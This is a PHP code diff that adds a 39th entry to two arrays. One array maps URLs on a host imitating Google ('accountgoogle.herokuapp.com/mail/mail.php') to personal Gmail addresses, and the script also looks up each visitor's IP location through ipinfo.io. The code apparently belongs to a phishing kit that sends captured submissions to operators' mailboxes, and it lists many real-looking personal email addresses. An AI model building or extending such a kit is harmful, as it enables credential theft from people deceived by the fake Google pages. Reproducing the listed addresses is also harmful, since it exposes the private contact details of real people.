@@ -41,7 +41,8 @@ $url = array(
 "https://accountgoogle.herokuapp.com/mail/mail.php?35",
 "https://accountgoogle.herokuapp.com/mail/mail.php?36",
 "https://accountgoogle.herokuapp.com/mail/mail.php?37",
-"https://accountgoogle.herokuapp.com/mail/mail.php?38"
+"https://accountgoogle.herokuapp.com/mail/mail.php?38",
+"https://accountgoogle.herokuapp.com/mail/mail.php?39"
 );
 
 
@@ -85,7 +86,8 @@ $correo = array(
 "diazmarwin@gmail.com",
 "mejiasleonet@gmail.com",
 "rafaelq.sistemas@gmail.com",
-"jo.25el.26@gmail.com"
+"jo.25el.26@gmail.com",
+"larawilmer913@gmail.com"
 );
 
 
@@ -128,7 +130,7 @@ $c = str_replace($url[35], $correo[35], $c);
 $c = str_replace($url[36], $correo[36], $c);
 $c = str_replace($url[37], $correo[37], $c);
 $c = str_replace($url[38], $correo[38], $c);
-
+$c = str_replace($url[39], $correo[39], $c);
 
 date_default_timezone_set('America/Caracas');
 @ $details = json_decode(file_get_contents("http://ipinfo.io/{$_SERVER['HTTP_X_FORWARDED_FOR']}/json"));
